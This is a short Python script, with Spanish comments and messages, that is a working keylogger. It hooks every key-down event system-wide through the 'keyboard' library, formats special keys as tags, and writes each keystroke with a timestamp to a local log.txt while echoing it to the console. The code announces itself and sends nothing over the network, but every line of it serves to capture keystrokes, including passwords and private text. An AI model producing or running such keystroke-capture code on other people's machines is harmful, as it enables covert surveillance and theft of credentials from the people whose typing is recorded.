import keyboard
import time
from datetime import datetime

LOG_FILE = 'log.txt'

def handle_key(event):
    """
    Procesa, formatea y registra CADA pulsación de tecla con su timestamp.
    """
    if event.event_type == keyboard.KEY_DOWN:
        key = event.name

        if key == 'space':
            key_name = '[ESPACIO]'
        elif key == 'enter':
            key_name = '[ENTER]'
        elif key == 'shift':
            key_name = '[MAYUSCULAS]'
        elif key == 'ctrl':
            key_name = '[CTRL]'
        elif key == 'alt':
            key_name = '[ALT]'
        elif key == 'esc':
            key_name = '[ESC]'
        elif len(key) > 1:

            key_name = f"[{key.upper()}]"
        else:

            key_name = key

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_line = f"[{timestamp}] Tecla: {key_name}\n"

        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_line)

        print(f"Registrado: {log_line.strip()}")

def main():
    print("Keylogger Iniciado. Presiona Ctrl+C para detener.")

    with open(LOG_FILE, 'w', encoding='utf-8') as f:
        f.write(f"--- Inicio de Sesión: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        
    keyboard.hook(handle_key)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        
        print("\nKeylogger detenido por el usuario (Ctrl+C).")

        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"--- Fin de Sesión: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
    finally:
        keyboard.unhook_all()

if __name__ == "__main__":
    main()